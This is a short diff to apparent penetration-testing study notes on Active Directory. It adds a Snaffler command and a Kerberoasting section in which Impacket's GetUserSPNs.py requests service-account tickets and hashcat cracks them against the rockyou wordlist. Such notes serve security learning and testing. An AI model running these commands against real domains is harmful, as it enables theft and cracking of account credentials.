@@ -122,6 +122,14 @@ Get-ADGroup -Filter * | select name
 
 Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. - https://github.com/SnaffCon/Snaffler
 ```
-
+snffler.exe
 ```
+
+Kerberoasting from Linux
+```
+GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request
+GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request-user <any-user> -outputfile <text-file-name>
+hashcat -m 13100 <text-file-name> /usr/share/wordlists/rockyou.txt 
+```
+
 
